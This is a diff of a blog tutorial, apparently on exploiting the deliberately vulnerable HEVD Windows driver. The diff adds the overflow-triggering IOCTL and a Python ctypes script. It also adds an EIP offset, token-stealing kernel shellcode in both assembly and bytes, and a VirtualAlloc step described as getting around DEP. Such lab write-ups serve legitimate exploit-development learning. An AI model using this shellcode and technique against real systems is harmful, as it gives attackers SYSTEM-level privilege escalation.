@@ -97,7 +97,7 @@ If the difference is smaller or equal to <code>0x6C</code>, the IOCTL is used in
 
 <br>
 
-To create IOCTLs, we can use online IOCTL decoder [^1] and provide all values in the given range to see which ones fit our needs. If we put the first value, 0x222003, we see that this is the correct IOCTL to trigger stack buffer overflow:
+To create IOCTLs, we can use online IOCTL decoder[^1] and provide all values in the given range to see which ones fit our needs. If we put the first value, 0x222003, we see that this is the correct IOCTL to trigger stack buffer overflow:
 
 ![Online IOCTL decoder](/assets/img/online_ioctl_decoder.png)
 *online IOCTL decoder*
@@ -113,11 +113,11 @@ From the [Primer](https://wojtekgoo.github.io/posts/A_Primer_On_Windows_Drivers/
 ioctl = hex((0x22 << 16) | (0x0 << 14) | (0x800 << 2) | 0x3)
 ```
 
-### <span class="myheader">Exploit code</span>
+### <span class="myheader">Buffer Overflow</span>
 
 With all the relevant information needed to trigger the vulnerability, we can build exploit. To develop exploit we will use <code>ctypes</code> library that allow Python code to call C functions and enable low-level memory manipulation.
 <br>
-To communicate, we need first to open a handle from userland to the target device using <code>CreateFile</code> API[^1], putting instead of file name name of the HEVD device, which we can get e.g. from the WinObj tool.
+To communicate, we need first to open a handle from userland to the target device using <code>CreateFile</code> API[^2], putting instead of file name name of the HEVD device, which we can get e.g. from the WinObj tool.
 
 ![Name of HEVD device](/assets/img/winobj_nameOfHevdDevice.png)
 *device name in WinObj tool*
@@ -147,16 +147,15 @@ if (not hevd) or (hevd == -1):
     sys.exit(1)
 
 # malicious payload
-payload = "A" * 0x900
-payload_ptr = id(payload) + 20
-payload_size = len(payload)
+buf = "A" * 0x900
+buf_size = len(buf)
 
 # send message to the device
 kernel32.DeviceIoControl(
     hevd,               # device handle
     0x222003,           # IOCTL
-    payload_ptr,            
-    payload_size,       
+    buf,            
+    buf_size,       
     None,
     0,
     byref(c_ulong()),
@@ -184,23 +183,116 @@ When we execute the script, we can observe that our breakpoint is hit and return
 ![BP triggered](/assets/img/windbg_bp_TriggerBufferOverflowStack.png)
 ![Buffer Overflow](/assets/img/windbg_stackBO.png)
 
-Using e.g. *pattern_create* and *pattern_offset* tools from the Metasploit framework, we can find correct offset for EIP:
+Using e.g. *pattern_create* and *pattern_offset* tools from the Metasploit framework, we can find correct offset for EIP (2080 bytes):
 
 ```python
 ...
 # malicious payload
-payload = "A" * 2076 + "BBBB" + "C"*224
-payload_ptr = id(payload)+20
-payload_size = len(payload)
+buf = "A" * 2080 + "BBBB" + "C"*220
+buf_size = len(buf)
 ...
 ```
 
+
+
 ![Buffer Overflow](/assets/img/windbg_correct_buffer_length.png)
 
+Knowing the offset needed to control EIP, we can move on to the final exploit code.
 
+### <span class="myheader">Exploit</span>
+
+The HackSysTeam published sample token stealing payload that we can use for our needs [^3]:
+
+```c++
+pushad                               ; Save registers state
+
+; Start of Token Stealing Stub
+xor eax, eax                         ; Set ZERO
+mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
+                                     ; _KTHREAD is located at FS:[0x124]
+
+mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
+
+mov ecx, eax                         ; Copy current process _EPROCESS structure
+
+mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
+
+SearchSystemPID:
+    mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
+    sub eax, FLINK_OFFSET
+    cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
+    jne SearchSystemPID
+
+mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
+mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
+                                     ; with SYSTEM process nt!_EPROCESS.Token
+; End of Token Stealing Stub
+
+popad                                ; Restore registers state
+
+; Kernel Recovery Stub
+xor eax, eax                         ; Set NTSTATUS SUCCEESS
+add esp, 12                          ; Fix the stack
+pop ebp                              ; Restore saved EBP
+ret 8                                ; Return cleanly
+```
+
+Comments are self-explanatory. The code replaces current's process token with the SYSTEM process token. If we execute then the Command Line, it'll run in the SYSTEM user context.
+Above code has been translated into assembly e.g. [here](https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/):
+
+```c++
+shellcode = (
+    b"\x60"                            # pushad
+    b"\x31\xc0"                        # xor eax,eax
+    b"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
+
+    b"\x8b\x40\x50"                    # mov eax,[eax+0x50]
+
+    b"\x89\xc1"                        # mov ecx,eax
+
+    b"\xba\x04\x00\x00\x00"            # mov edx,0x4
+
+    b"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
+    b"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
+    b"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
+    b"\x75\xed"                        # jnz 0x1a
+    
+    b"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8] Get SYSTEM process nt!_EPROCESS.Token
+    b"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
+
+    b"\x61"                            # popad  Restore registers state
+
+    b"\x31\xc0"                        # xor eax,eax
+    b"\x5d"                            # pop ebp
+    b"\xc2\x08\x00"                    # ret 0x8
+)
+```
+
+One last thing to take care of is the Data Execution Prevention [^4] security mechanism that would block our shellcode if we run it directly from the stack.
+To bypass that, we could use e.g. VirtualAlloc function [^5] that will allocate an executable piece of memory for us:
+
+```c++
+# Bypass DEP and allocate executable memory for shellcode
+va_ptr = kernel32.VirtualAlloc(
+    c_int(0),                   # lpAddress
+    c_int(len(shellcode)),      # dwSize
+    c_int(0x3000),              # flAllocationType (MEM_COMMIT | MEM_RESERVE)
+    c_int(0x40))                # flProtect (PAGE_EXECUTE_READWRITE)
+
+
+# Move shellcode to the allocated memory
+kernel32.RtlMoveMemory(
+    c_int(va_ptr),              # Destination
+    shellcode,                  # Source
+    c_int(len(shellcode))       # Length
+)
+```
 
 
 ## <span class="myheader">References<span>
 
 [^1]: https://www.osronline.com/article.cfm%5earticle=229.htm
 [^2]: https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
+[^3]: https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/Payloads.c
+[^4]: https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention
+[^5]: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
